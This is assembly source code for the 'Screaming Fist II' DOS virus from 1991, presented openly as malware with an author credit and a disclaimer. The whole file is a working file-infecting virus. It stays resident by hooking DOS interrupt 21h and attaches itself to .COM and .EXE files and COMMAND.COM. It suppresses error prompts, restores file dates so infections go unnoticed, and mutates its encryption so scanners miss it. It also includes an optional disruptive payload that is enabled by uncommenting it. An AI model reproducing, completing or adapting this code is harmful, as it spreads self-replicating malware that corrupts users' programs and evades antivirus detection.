ORG 100H


; The Screaming Fist II virus (c)1991 by Lazarus Long, Inc.
;  The author assumes no responsibility for any damage incurred
;  from the infection caused by this virus

CURTAIN_OPEN EQU $

ARE_WE_RESIDENT?:
 CLD                                 ;Do not remove this
 CALL DECRYPT_US

NEXT_PLACE:

 MOV AH,30H                          ;Get DOS version
 INT 21H
 CMP AL,2                            ;Lower than 2?
 JBE LEAVE_AND_RESTORE               ;Yes,exit
 XOR AX,AX
 DEC AX                              ;Will return AX=0 if virus is resident
 INT 21H
 OR AX,AX                            ;Are we resident?
 JZ LEAVE_AND_RESTORE                ;If not, install

START:
 PUSH DS
 XOR  AX,AX                          ;Now make DS=0
 MOV  DS,AX
 DEC  WORD PTR [413H]                ;Decrease available memory by 1k
 LDS  BX,[0084]                      ;Get INT 21 vector and save it
 CS:
 MOV  [BP+OLD_21_BX-NEXT_PLACE],BX
 CS:
 MOV  [BP+OLD_21_ES-NEXT_PLACE],DS
 MOV  BX,ES                          ;Get address of our memory block
 DEC  BX
 MOV  DS,BX
 SUB  WORD PTR [0003],80H           ;Decrease memory allocated to this program
 MOV  AX,[0012]                      ;Decrease total memory
 SUB  AX,80H                        ;By 80 paragraphs
 MOV  [0012],AX                      ;And save it again
 MOV  ES,AX                          ;Also gives us ES=Top of memory
 PUSH CS                             ;CS=DS
 POP  DS                             ;
 MOV  SI,BP                          ;
 SUB  SI,OFFSET NEXT_PLACE - 100H    ;Offset of code to move
 MOV  DI,100H                        ;ES:100h is destination
 MOV  CX,LENGTH                      ;Move entire virus
 REPZ MOVSB                          ;Move entire virus to top of memory
 MOV  DS,CX                          ;DS=0
 CLI                                 ;Disable interrupts
 MOV  [0086],AX
 MOV  WORD PTR [0084],OFFSET NEW_21  ;Set INT 21 to our code in high memory
 STI                                 ;Enable interrupts
 MOV AX,3DFFH                        ;Code to infect command processor
 INT 21H
 POP DS                              ;DS=ES
 PUSH DS
 POP ES

LEAVE_AND_RESTORE:
 ;PUSH DS                            This is just some silly code
 ;XOR AX,AX                          That will cause random problems
 ;MOV DS,AX                          Like floppies not working
 ;IN AL,21H                          Or the system clock stopping
 ;XOR AL,[046CH]B                    If you want to use it
 ;AND AL,0FDH                        Just remove the semi-colons
 ;OUT 21H,AL
 ;POP DS

 SUB BP,OFFSET NEXT_PLACE - 100H         ;
 OR BP,BP
 JZ LEAVE_EXE                            ;A zero BP means we're leaving an .EXE
 LEA SI,[BP+ORIGINAL_EIGHT-NEXT_PLACE+4] ;Restore original eight bytes so
                                         ;we can RET to them
 MOV  DI,100H
 PUSH DI                                 ;Restore first four bytes
 MOVSW
 MOVSW
 RET                                     ;And return to 100

LEAVE_EXE:
 MOV AX,ES                               ;Use ES for a displacment value
 ADD CS:OLD_CS_DISP - 100H,AX            ;Fix up the CS value
 ADD CS:OLD_SS_DISP - 100H,AX            ;And the SS value

 MOV SS,CS:offset OLD_SS_WORD - 100h     ;Set the correct SS
 MOV SP,CS:offset OLD_SP_WORD - 100h     ;And the correct SP
 JMP $+2                         ;Necessary for .EXE's to run right
                                 ;DO NOT REMOVE! IF YOU DO, .EXE's WON'T RUN!

DB ,0EAH,                        ;Makes a far jump to the original .EXE
                                 ;Entry point

ORIGINAL_EIGHT EQU $

OLD_IP      EQU $
                MOV AH,4CH     ;.COM file beginning stored here

OLD_CS_DISP EQU $
                INT 21H        ;

OLD_SS_DISP EQU $
OLD_SS_WORD DW 00 00           ;Save old SS here

OLD_SP EQU $
OLD_SP_WORD DW 00 00           ;And old SP here

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
;Here is where the resident part begins in high memory.                        ;
;On systems with 640k, this is usually at segment 9F80                         ;
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;

NEW_21:
 PUSHF
 CMP AX,0FFFFH                   ;AX=FFFF means a program is asking
 JNZ CONTINUE_ASKING             ;If the virus is resident

 POPF                            ;Return to show that virus is resident
 INC AX                          ;Return AX=0 to show that we are resident
 IRET

CONTINUE_ASKING:       ;Infect files on:
 CMP AH,3DH            ;Opening
 JZ OPENING
 CMP AH,4BH            ;Running
 JZ INFECT_REGULAR
 CMP AH,43H            ;Chmod
 JZ INFECT_REGULAR
 CMP AH,56H            ;Renaming
 JZ INFECT_REGULAR

 JMP SHORT OUTTA_HERE

OPENING:
 CMP AL,0FFH                     ;Do we need to infect command processor?
 JNZ INFECT_REGULAR              ;Nope, continue

 PUSH CS                         ;DS=CS
 POP DS
 MOV DX,OFFSET COMMAND           ;If so, let's use C:\COMMAND.COM

COM_FILE:
 CALL DISEASE
 POPF
 IRET

INFECT_REGULAR:

 PUSH AX                         ;Save AX
 CALL CHECK_NAME                 ;Is DS:DX a .COM or an .EXE file?
 OR AX,AX                        ;A non-zero AX means nope
 JNZ OUT_WITH_POP
 CALL DISEASE                    ;Infect file

OUT_WITH_POP:
 POP AX                          ;Restore AX
OUTTA_HERE:
 POPF                            ;Continue with old INT 21

DB ,0EAH,                        ;Code for a JMP FAR

OLD_21_BX DW 00 00               ;Old Int 21 location is stored here
OLD_21_ES DW 00 00               ;

FUNCTION:                        ;Used by virus to call old INT 21
 PUSHF
 CALL DWORD PTR CS:[OLD_21_BX]
 RET


;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
;This portion handles the actual infection process                             ;
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
DISEASE:

         PUSH AX                           ;Save all registers
         PUSH BX
         PUSH CX
         PUSH DX
         PUSH SI
         PUSH DI
         PUSH DS
         PUSH ES
         PUSH DX

ABOVE_2:
         MOV CS:[OLD_DS]W,DS               ;Save DS
         MOV CS:[OLD_ES]W,ES               ;Save ES
         PUSH CS                           ;CS=DS=ES
         PUSH CS
         POP DS
         POP ES
         MOV AX,3524H                      ;Get INT 24 address
         CALL FUNCTION                     ;
         MOV OFFSET OLD_24_BX,BX           ;Save it
         MOV OFFSET OLD_24_ES,ES           ;
         MOV AH,25H                        ;Now set it to our own code
         LEA DX,OFFSET NEW_24              ;Offset of our INT 24 code
         CALL FUNCTION                     ;

         MOV AH,36H                      ;Get disk free space
         XOR DL,DL                       ;And quit if less than virus length
         CALL FUNCTION
         JC NEED_TO_LEAVE
         OR DX,DX
         JNZ SET_ATTRIBS
         MUL CX
         MUL BX
         CMP AX,LENGTH
         JNB SET_ATTRIBS

NEED_TO_LEAVE:
         POP DX                      ;Clear stack
         JMP DONE                    ;And return


SET_ATTRIBS:
         POP DX
         PUSH DX
         MOV DS,OLD_DS
         MOV AX,4300H                ;Get the attributes
         CALL FUNCTION
         MOV CS:[OLD_ATTRIBS],CX     ;Save them for later
         XOR CX,CX
         MOV AX,4301H
         CALL FUNCTION                   ;Set attribs to normal
         JC LEAVE_WITH_ATTRIBS           ;Leave if error

OPEN_IT:
         MOV AX,3D02H                    ;Open file with Read and Write access
         CALL FUNCTION
         JC NEED_TO_LEAVE                ;Quit on error
         PUSH CS                         ;CS=DS
         POP  DS
         XCHG BX,AX                      ;Save handle
         MOV AH,3FH                      ;Read BUF_LENGTH bytes into CS:BUFFER
         LEA DX,BUFFER                   ;Offset of buffer
         MOV CX,BUF_LENGTH               ;Read 'Em
         CALL FUNCTION
         JC LEAVE_AND_CLOSE              ;Quit on error
         CMP OFFSET BUFFER,5A4DH         ;Is this an .EXE file?
         JZ NAIL_EXE                     ;If so, we gotta do some things

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
;This portion handles a .COM infection                                         ;
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
         MOV AL,[BUFFER+3]B              ;An indentical byte means this .COM is
         INC AL
         CMP AL,[BUFFER+1]B              ;probably already infected
         JNZ CONTINUE_TO_INFECT          ;If it isn't, let's get it!

LEAVE_AND_CLOSE:
         MOV AH,3EH                      ;Close this file
         CALL FUNCTION

LEAVE_WITH_ATTRIBS:
         POP DX
         PUSH DX
         CALL RESTORE_ATTRIBS            ;Restore the attributes if needed
         JMP SHORT NEED_TO_LEAVE

CONTINUE_TO_INFECT:

         MOV SI,OFFSET BUFFER        ;Starting at CS:BUFFER
         PUSH CS                     ;CS=ES
         POP ES
         LEA DI,OFFSET ORIGINAL_EIGHT;Where to save original eight bytes to
         MOVSW                       ;Save infected files original eight bytes
         MOVSW

         MOV AX,4202H                ;Send RW pointer to end of file
         XOR CX,CX
         XOR DX,DX
         CALL FUNCTION
         OR DX,DX                    ;A non-zero DX means too big of a file
         JNZ LEAVE_AND_CLOSE
         CMP AX,300                  ;Don't infect files less than 300 bytes
         JB LEAVE_AND_CLOSE
         CMP AX,64000                ;Or bigger than 64000
         JA LEAVE_AND_CLOSE
         SUB AX,3                    ;Use the pointer as our jump code
         MOV [BUFFER]B,0E9H          ;Code for absolute JMP
         MOV [BUFFER+1],AX           ;This sets up the .COM so we can tell
         DEC AL                      ;If it's infected next time we see it
         MOV [BUFFER+3],AL
         JMP SHORT ATTACH            ;Continue past .EXE infector

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
;This portion handles infecting all .EXE files                                 ;
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
NAIL_EXE:

         CMP     WORD PTR [BUFFER+14H],1 ;Offset of IP reg. Is this .EXE infected?
         JZ      LEAVE_AND_CLOSE         ;Leave if already infected

GET_EXE:
         MOV     AX,[BUFFER+4]           ;EXE size in 512 byte pages
         MOV     CX,0200H                ;Multiply by 512 to get filesize
         MUL     CX                      ;
         PUSH    AX                      ;Save AX, AX=Filesize low byte
         PUSH    DX                      ;Save DX, DX=Filesize high byte
         MOV     CL,04                   ;
         ROR     DX,CL                   ;
         SHR     AX,CL                   ;
         ADD     AX,DX                   ;
         SUB     AX,[BUFFER+8]           ;Size of header in 16 byte paragraphs
         PUSH    AX                      ;AX is new code segment displacement
         MOV     AX,[BUFFER+14H]         ;Get old IP register
         MOV     [OLD_IP],AX             ;Save it here
         MOV     AX,[BUFFER+16H]         ;Get old code segment displacement
         ADD     AX,10H                  ;Add 10 to it
         MOV     [OLD_CS_DISP],AX        ;Save it here
         MOV     AX,[BUFFER+14]          ;Get old stack segment
         ADD     AX,10H                  ;Adjust it for later
         MOV     [OLD_SS_DISP],AX        ;And save it here
         MOV     AX,[BUFFER+16]          ;Get stack pointer
         MOV     [OLD_SP],AX             ;And save it here
         POP     AX                      ;Restore AX
         MOV     [BUFFER+16H],AX         ;New code segment
         MOV     [BUFFER+14],AX          ;New SS=CS
         MOV     [BUFFER+16],0FFFFH      ;SP = End of viral code
         MOV     WORD PTR [BUFFER+14H],1 ;New IP register
         ADD     WORD PTR [BUFFER+4],2   ;Size of file in 512 byte pages
         POP     CX
         POP     DX
         MOV     AX,4200H                ;Move file pointer
         CALL    FUNCTION

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
; Attach our viral code to the target file                                     ;
; This portion is shared by the .EXE and the .COM infectors to be more         ;
; efficient                                                                    ;
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;

ATTACH:

         MOV AX,5700H                ;Get the file time and date
         CALL FUNCTION
         PUSH CX                     ;And save them for later
         PUSH DX

INFECT:

         XOR AX,AX
         MOV DS,AX
         MOV AX,[046CH]              ;Get a random encryption key from timer
         MOV DL,AH                   ;Save part of it in DL
         PUSH CS                     ;DS=CS
         POP DS                      ;
         MOV ENC_BYTE,AL             ;Save keys in our code
         MOV ENC_BYTE_2,DL
         PUSH CS                     ;CS=ES
         POP ES
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;This section provides a semi-random encryption code mutation based on our     บ
;encryption keys. Look at each line for a desc. of what it does to the code.   บ
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
         TEST AL,1
         JZ SKIP_1
         XOR WORD PTR ENC_SWITCH,0ABDEH ;MOV SI,BP <=> PUSH BP POP SI
SKIP_1:
         TEST DL,1
         JZ SKIP_2
         XOR BYTE PTR [ENC_SWITCH_2 + 1],012H  ;OR DL,AL <=> XOR AL,DL
SKIP_2:
         TEST AL,2
         JZ SKIP_4
         XOR BYTE PTR [ENC_SWITCH_4 + 2],010H
SKIP_4:
         TEST DL,2
         JZ SKIP_5
         XOR BYTE PTR [ENC_SWITCH_5 + 2],010H
SKIP_5:
         TEST AL,3
         JZ SKIP_6
         XOR BYTE PTR [ENC_SWITCH_1 + 1],08H
SKIP_6:
         TEST DL,3
         JZ SKIP_7
         XOR BYTE PTR [ENC_SWITCH_3 + 1],08H
SKIP_7:
         TEST AL,4
         JZ SKIP_8
         XOR BYTE PTR [ENC_SWITCH_6 + 1],08H
SKIP_8:
         MOV SI,CURTAIN_OPEN
         MOV DI,DATA_END
         PUSH DI
         PUSH DI
         MOV CX,LENGTH
         REPZ MOVSB
         POP SI
         ADD SI,4
         CALL ENCRYPT_US
         POP DX
         MOV AH,40H                  ;Code for handle write
         MOV CX,LENGTH               ;Length of our viral code
         CALL FUNCTION               ;Write all of virus

MAKE_HEADER:
         MOV AX,4200H                 ;Set file pointer to beginning
         XOR CX,CX                    ;Zero out CX
         XOR DX,DX                    ;Zero out DX
         CALL FUNCTION
         MOV AH,40H                   ;Write to file
         MOV DX,OFFSET BUFFER         ;Starting at BUFFER
         MOV CX,BUF_LENGTH            ;Write BUF_LENGTH bytes
         CALL FUNCTION

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
; This restores the files original date and time                               ;
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;

RESTORE_TIME:
         MOV AX,5701H                   ;Restore original date and time
         POP DX                         ;To what was read in earlier
         POP CX                         ;
         CALL FUNCTION                  ;
         JMP LEAVE_AND_CLOSE            ;Leave

DONE:
         MOV DX,OFFSET OLD_24_BX W         ;Move the old INT 24's address
         MOV DS,OFFSET OLD_24_ES W         ;so we can restore it
         MOV AX,2524H                      ;Restore it
         CALL FUNCTION
         POP  ES                           ;Restore all registers
         POP  DS
         POP  DI
         POP  SI
         POP  DX
         POP  CX
         POP  BX
         POP  AX
         RET                               ;And quit

RESTORE_ATTRIBS:
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
; This routine restores the files original attributes.                         ;
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
         MOV AX,4301H                   ;Restore original attribs
         MOV CX,[OLD_ATTRIBS]           ;To what was read in earlier
         MOV DS,OLD_DS
         CALL FUNCTION
         RET

NEW_24:
         XOR AX,AX                      ;Any error will simply be ignored
         STC                            ;Most useful for write protects
         IRET

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
;Please don't be a lamer and change the text to claim it was your own creation ;
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;

TEXT    DB 'Screaming Fist II'    ;For the AV people, can't have a dumb name!
COMMAND DB 'C:\COMMAND.COM',00                ;File infected

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
; This routine checks to see if the file at DS:DX has an extension of either   ;
; .COM or .EXE. AX is set to zero if either condition is met, and non-zero     ;
; If they aren't.                                                              ;
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;

CHECK_NAME:
         PUSH SI
         MOV SI,DX

CHECK_FOR_PERIOD:
         LODSB
         OR AL,AL
         JZ LEAVE_NAME_CHECK
         CMP AL,'.'
         JNZ CHECK_FOR_PERIOD
         LODSB
         AND AL,0DFH
         CMP AL,'C'
         JZ MAYBE_COM
         CMP AL,'E'
         JZ MAYBE_EXE
         JMP SHORT LEAVE_NAME_CHECK

MAYBE_COM:
         LODSW
         AND AX,0DFDFH
         CMP AX,'MO'
         JZ FILE_GOOD
         JMP SHORT LEAVE_NAME_CHECK

MAYBE_EXE:
         LODSW
         AND AX,0DFDFH
         CMP AX,'EX'
         JNZ LEAVE_NAME_CHECK

FILE_GOOD:
         XOR AX,AX

LEAVE_NAME_CHECK:
         POP SI
         RET

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;This is the encryption routine. This is the only portion that remains         บ
;unencrypted. The bytes mark by an ENC_SWITCH are changed to throw off SCAN    บ
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

ENC_START EQU $

DECRYPT_US:
         POP BP
         PUSH BP

ENC_SWITCH EQU $
         MOV SI,BP                 ;Alternates between this and PUSH BP, POP SI

         MOV AL,CS:[BP+ENC_BYTE-NEXT_PLACE]   ;Get ENC key #1
         MOV DL,CS:[BP+ENC_BYTE_2-NEXT_PLACE] ;Get ENC key #2

ENCRYPT_US:
         MOV CX,ENC_LENGTH         ;Length to encrypt or decrypt

ENCRYPT_US_II:
ENC_SWITCH_1 EQU $
         NOT AL                    ;Alternates bewtween NOT and NEG

ENC_SWITCH_2 EQU $
         XOR DL,AL                 ;Alternates between this and XOR AL,DL

ENC_SWITCH_4 EQU $
         XOR BYTE PTR CS:[SI],AL   ;Alternates bewteen AL and DL
         SUB AL,DL

ENC_SWITCH_3 EQU $
         NOT DL                    ;Alternates between NOT and NEG

ENC_SWITCH_5 EQU $
         XOR BYTE PTR CS:[SI],DL   ;Alternates between DL and AL
         INC SI                    ;INC encryption pointer
ENC_SWITCH_6 EQU $
         INC DL                    ;Alternates between INC and DEC
         LOOP ENCRYPT_US_II
         RET

ENC_BYTE   DB 00   ;Storage space for encryption keys
ENC_BYTE_2 DB 00

FINI EQU $

LENGTH = FINI - CURTAIN_OPEN

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
;This is the data table and is not included in the virus size                  ;
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ;
DATA_BEGIN EQU $

OLD_ATTRIBS DW 00 00      ;File's old attributes

OLD_24_ES DW 00 00        ;Saves address of old INT 24
OLD_24_BX DW 00 00

OLD_DS DW 00 00           ;Saves DS and ES here on entering
OLD_ES DW 00 00

BUFFER_BEGIN EQU $
BUFFER EQU $
    DB 1BH DUP(0)         ;Buffer for bytes read in from file
BUFFER_END EQU $

DATA_END EQU $

DATA_LENGTH = DATA_END - DATA_BEGIN        ;Length of Data Table

BUF_LENGTH = BUFFER_END - BUFFER_BEGIN     ;Length of file buffer

ENC_LENGTH = ENC_START - OFFSET NEXT_PLACE
